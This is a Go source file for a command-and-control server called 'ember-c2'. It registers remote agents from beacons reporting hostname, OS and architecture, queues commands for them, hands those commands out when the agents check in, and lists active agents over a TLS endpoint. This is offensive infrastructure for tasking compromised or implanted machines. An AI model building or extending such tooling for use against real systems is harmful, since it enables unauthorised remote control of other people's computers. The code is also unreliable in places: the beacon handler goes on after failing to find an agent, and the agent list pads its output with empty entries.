package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/ash-tise/ember-c2/internal/proto"
)

var activeAgents = make(map[string]*proto.AgentMetadata)
var agentMutex sync.Mutex

func initLogger() {
	// create or append to logfile
	logFile, err := os.OpenFile("ember.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("FATAL: Could not open log file: %v", err)
	}
	// initialize multiwriter for logging to stdout and file
	multiwriter := io.MultiWriter(os.Stdout, logFile)

	// configure logging options
	log.SetOutput(multiwriter)
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)

	log.Println("Ember Logger Initialized. Writing to ember.log and Console.")
}

func initConsole() {
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	// grab beacon info from agent
	var initBeacon proto.Beacon
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&initBeacon); err != nil {
		log.Printf("ERROR: handleRegister: Failed to decode initBeacon JSON: %v", err)
		http.Error(w, "Invalid request format", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()
	log.Println("OPERATIONAL: Received registration attempt from Host:", initBeacon.Hostname)

	// generate random agentID and send back to the agent
	buffer := make([]byte, 16)
	if _, err := rand.Read(buffer); err != nil {
		log.Printf("FATAL INTERNAL ERROR: crypto/rand failure: %v", err)
		http.Error(w, "Service Unavailable", http.StatusInternalServerError)
		return
	}
	initBeacon.AgentID = hex.EncodeToString(buffer)

	// store new agent information on the server
	newAgent := proto.AgentMetadata{
		AgentID:      initBeacon.AgentID,
		Hostname:     initBeacon.Hostname,
		OS:           initBeacon.OS,
		Arch:         initBeacon.Arch,
		LastCheckIn:  time.Now(),
		CommandQueue: make(chan proto.Command, 10)}

	agentMutex.Lock()
	defer agentMutex.Unlock()
	activeAgents[initBeacon.AgentID] = &newAgent

	// return agentID to agent
	w.Write([]byte(initBeacon.AgentID))
}

func handleBeacon(w http.ResponseWriter, r *http.Request) {
	// grab beacon data
	var beacon proto.Beacon
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&beacon); err != nil {
		log.Printf("ERROR: handleBeacon: Failed to decode Beacon JSON: %v", err)
		http.Error(w, "Invalid request format", http.StatusBadRequest)
		return
	}

	// identify agent and update CheckIn timestamp
	agentID := beacon.AgentID

	agentMutex.Lock()
	defer agentMutex.Unlock()

	agent, ok := activeAgents[agentID]
	if !ok {
		http.Error(w, "Agent not found", http.StatusNotFound)
	}
	agent.LastCheckIn = time.Now()

	var commandsToSend []proto.Command

	// check for any commands in queue
MainLoop:
	for {
		select {
		case command := <-agent.CommandQueue:
			commandsToSend = append(commandsToSend, command)
		default:
			break MainLoop
		}
	}

	// send commands to agent
	if len(commandsToSend) > 0 {
		response := proto.Response{Commands: commandsToSend}
		data, err := json.Marshal(&response)
		if err != nil {
			log.Printf("INTERNAL ERROR: Unable to encode command list of agent %s into JSON: %v", agentID, err)
			http.Error(w, "Service Unavailable", http.StatusInternalServerError)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write(data)

	} else {
		w.WriteHeader(http.StatusNoContent)
	}
}

func handleAgentList(w http.ResponseWriter, r *http.Request) {
	// lock activeAgents map
	agentMutex.Lock()
	defer agentMutex.Unlock()

	toReturn := make([]proto.AgentMetadata, len(activeAgents))

	for _, val := range activeAgents {
		toReturn = append(toReturn, *val)
	}

	// encode JSON and send back to client
	data, err := json.Marshal(toReturn)
	if err != nil {
		log.Printf("INTERNAL ERROR: Unable to encode agent list into JSON: %v", err)
		http.Error(w, "Service Unavailable", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func main() {
	// initialize logger and console
	initLogger()
	go initConsole()

	// initialize server and endpoints
	mux := http.NewServeMux()
	mux.HandleFunc("/register", handleRegister)    // register a new agent
	mux.HandleFunc("/beacon", handleBeacon)        // process agent beacons
	mux.HandleFunc("/api/agents", handleAgentList) // return active agents in JSON format
	log.Fatal(http.ListenAndServeTLS("localhost:8443", "server.crt", "server.key", mux))
}
